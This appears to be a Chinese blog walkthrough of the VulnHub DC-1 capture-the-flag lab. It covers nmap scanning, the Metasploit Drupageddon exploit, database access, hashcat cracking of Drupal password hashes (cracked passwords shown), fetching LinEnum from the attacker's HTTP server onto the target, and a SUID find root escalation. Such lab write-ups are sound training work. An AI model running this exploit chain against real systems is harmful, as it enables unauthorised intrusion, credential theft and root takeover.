---
# 这是页面的图标
icon: api
# 这是文章的标题
title: DC1-Walkthrough
# 设置作者
author: lhz
# 设置写作时间
time: 2021-09-01
# 一个页面只能有一个分类
category: 渗透
# 一个页面可以有多个标签
tag:
  - 渗透
  - vulnhub
  - DC
comment: false
typora-root-url: ..\..\..\..\.vuepress\public
---

## 0x01 部署

靶机地址：

><https://www.vulnhub.com/entry/dc-1,292/>

根据靶机说明，需要找到5个flag

下载镜像, 使用vmware打开, 网络选择NAT模式

## 0x02 信息收集
nmap扫描网段
```bash
nmap -sP 192.168.190.0/24
```
![dc1](/assets/img/target/dc1.png)  
发现目标IP:`192.168.190.134`  

进一步扫描端口
```bash
nmap -T5 -A -v -p- 192.168.190.134
```
扫描结果：
```
Starting Nmap 7.91 ( https://nmap.org ) at 2021-09-01 17:38 CST
Happy 24th Birthday to Nmap, may it live to be 124!
NSE: Loaded 153 scripts for scanning.
NSE: Script Pre-scanning.
Initiating NSE at 17:38
Completed NSE at 17:38, 0.00s elapsed
Initiating NSE at 17:38
Completed NSE at 17:38, 0.00s elapsed
Initiating NSE at 17:38
Completed NSE at 17:38, 0.00s elapsed
Initiating Ping Scan at 17:38
Scanning 192.168.190.134 [2 ports]
Completed Ping Scan at 17:38, 0.00s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 17:38
Completed Parallel DNS resolution of 1 host. at 17:38, 0.00s elapsed
Initiating Connect Scan at 17:38
Scanning 192.168.190.134 [65535 ports]
Discovered open port 80/tcp on 192.168.190.134
Discovered open port 22/tcp on 192.168.190.134
Discovered open port 111/tcp on 192.168.190.134
Discovered open port 48247/tcp on 192.168.190.134
Completed Connect Scan at 17:38, 2.57s elapsed (65535 total ports)
Initiating Service scan at 17:38
Scanning 4 services on 192.168.190.134
Completed Service scan at 17:38, 11.01s elapsed (4 services on 1 host)
NSE: Script scanning 192.168.190.134.
Initiating NSE at 17:38
Completed NSE at 17:39, 1.62s elapsed
Initiating NSE at 17:39
Completed NSE at 17:39, 0.11s elapsed
Initiating NSE at 17:39
Completed NSE at 17:39, 0.00s elapsed
Nmap scan report for 192.168.190.134
Host is up (0.00019s latency).
Not shown: 65531 closed ports
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 6.0p1 Debian 4+deb7u7 (protocol 2.0)
| ssh-hostkey:
|   1024 c4:d6:59:e6:77:4c:22:7a:96:16:60:67:8b:42:48:8f (DSA)
|   2048 11:82:fe:53:4e:dc:5b:32:7f:44:64:82:75:7d:d0:a0 (RSA)
|_  256 3d:aa:98:5c:87:af:ea:84:b8:23:68:8d:b9:05:5f:d8 (ECDSA)
80/tcp    open  http    Apache httpd 2.2.22 ((Debian))
|_http-favicon: Unknown favicon MD5: B6341DFC213100C61DB4FB8775878CEC
|_http-generator: Drupal 7 (http://drupal.org)
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
| http-robots.txt: 36 disallowed entries (15 shown)
| /includes/ /misc/ /modules/ /profiles/ /scripts/
| /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt
| /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt
|_/LICENSE.txt /MAINTAINERS.txt
|_http-server-header: Apache/2.2.22 (Debian)
|_http-title: Welcome to Drupal Site | Drupal Site
111/tcp   open  rpcbind 2-4 (RPC #100000)
| rpcinfo:
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100024  1          46013/udp   status
|   100024  1          47802/tcp6  status
|   100024  1          48247/tcp   status
|_  100024  1          58175/udp6  status
48247/tcp open  status  1 (RPC #100024)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
Initiating NSE at 17:39
Completed NSE at 17:39, 0.00s elapsed
Initiating NSE at 17:39
Completed NSE at 17:39, 0.00s elapsed
Initiating NSE at 17:39
Completed NSE at 17:39, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 19.83 seconds
```

发现80端口，且运行的是Drupal

## 0x03 漏洞利用

使用浏览器访问目标机80端口，确定运行Drupal

Drupal存在已知的可利用漏洞：[已知Drupal漏洞](../../web/cms/#drupal)，使用msf搜索drupal

![dc1.0](/assets/img/dc1.0.png)

尝试使用后，使用 `exploit/multi/http/drupal_drupageddon` 获得metaerpreter shell

![image-20210903095826691](/assets/img/image-20210903095826691.png)

### flag1

执行`ls`发现flag1.txt，查看内容

![image-20210903100132779](/assets/img/image-20210903100132779.png)

### flag2

根据flag1的内容，flag可能在drupal的配置文件中，执行`shell`获取shell后，执行`grep -Rn "flag2" *`发现flag2在`sites/default/settings.php`第5行，查看flag

![image-20210903102601943](/assets/img/image-20210903102601943.png)

### flag3

flag2提示要通过认证，但是暴力破解不是唯一的方法。配置文件flag2的下面就是数据库配置，考虑通过进入数据库查看账号密码。

获取交互shell

`python -c 'import pty; pty.spawn("/bin/sh")'`

通过`mysql -u dbuser -p`链接数据库

![image-20210903105023673](/assets/img/image-20210903105023673.png)

进入drupaldb库，查看所有表

`use drupaldb`

`show tables`

```
+-----------------------------+
| Tables_in_drupaldb          |
+-----------------------------+
| actions                     |
| authmap                     |
| batch                       |
| block                       |
| block_custom                |
| block_node_type             |
| block_role                  |
| blocked_ips                 |
| cache                       |
| cache_block                 |
| cache_bootstrap             |
| cache_field                 |
| cache_filter                |
| cache_form                  |
| cache_image                 |
| cache_menu                  |
| cache_page                  |
| cache_path                  |
| cache_update                |
| cache_views                 |
| cache_views_data            |
| comment                     |
| ctools_css_cache            |
| ctools_object_cache         |
| date_format_locale          |
| date_format_type            |
| date_formats                |
| field_config                |
| field_config_instance       |
| field_data_body             |
| field_data_comment_body     |
| field_data_field_image      |
| field_data_field_tags       |
| field_revision_body         |
| field_revision_comment_body |
| field_revision_field_image  |
| field_revision_field_tags   |
| file_managed                |
| file_usage                  |
| filter                      |
| filter_format               |
| flood                       |
| history                     |
| image_effects               |
| image_styles                |
| menu_custom                 |
| menu_links                  |
| menu_router                 |
| node                        |
| node_access                 |
| node_comment_statistics     |
| node_revision               |
| node_type                   |
| queue                       |
| rdf_mapping                 |
| registry                    |
| registry_file               |
| role                        |
| role_permission             |
| search_dataset              |
| search_index                |
| search_node_links           |
| search_total                |
| semaphore                   |
| sequences                   |
| sessions                    |
| shortcut_set                |
| shortcut_set_users          |
| system                      |
| taxonomy_index              |
| taxonomy_term_data          |
| taxonomy_term_hierarchy     |
| taxonomy_vocabulary         |
| url_alias                   |
| users                       |
| users_roles                 |
| variable                    |
| views_display               |
| views_view                  |
| watchdog                    |
+-----------------------------+
```

发现user表，查看表中信息

![image-20210903105329450](/assets/img/image-20210903105329450.png)

这里通过hashcat破解密码，字典使用kali的rockyou.txt。

hashcat使用介绍：[hashcat使用](../../tools/hashcat.md)

查询Drupal模式id

![image-20210903105827686](/assets/img/image-20210903105827686.png)

执行破解

```bash
echo "\$S\$DvQI6Y600iNeXRIeEMF94Y6FvN8nujJcEDTCP9nS5.i38jnEKuDR" > hash.txt
echo "\$S\$DWGrxef6.D0cwB5Ts.GlnLw15chRRWH2s1R3QBwC0EkvBQ/9TCGg" >> hash.txt
hashcat -m 7900 -a 0 hash.txt /usr/share/wordlists/rockyou.txt 
```

耗时一小时40分钟破解完成，获得admin密码53cr3t，Fred密码MyPassword

![dc1.1](/assets/img/dc1.1.png)

使用admin账号登录，在Dashboard中发现flag3

<img src="/assets/img/image-20210903110313231.png" alt="image-20210903110313231" style="zoom: 80%;" />

### flag4

根据flag3的提示，`cat /etc/passwd`

![image-20210903110638671](/assets/img/image-20210903110638671.png)

发现flag4用户，查看home下存在flag4.txt，查看内容获得flag4

![image-20210903110757247](/assets/img/image-20210903110757247.png)

### flag5

根据flag4提示，通过同样方法在root下获取flag，尝试没有权限

![image-20210903110856064](/assets/img/image-20210903110856064.png)

使用LineEnum提权

在kali上下载LineEnum，并启动一个HTTP服务roo

```bash
git clone https://github.com/rebootuser/LinEnum.git
cd LinEnum
python -m SimpleHTTPServer 8080
```

在目标机上下载LineEnumh后执行

```bash
wget http://192.168.190.129:8080/LinEnum.sh
bash LinEnum.sh
```

发现find可以利用

![image-20210903112212502](/assets/img/image-20210903112212502.png)

执行

```bash
find . -exec /bin/sh \; -quit
```

查看权限成功提权

![image-20210903112327340](/assets/img/image-20210903112327340.png)

查看/root下flag文件，获得flag5

![image-20210903112449541](/assets/img/image-20210903112449541.png)

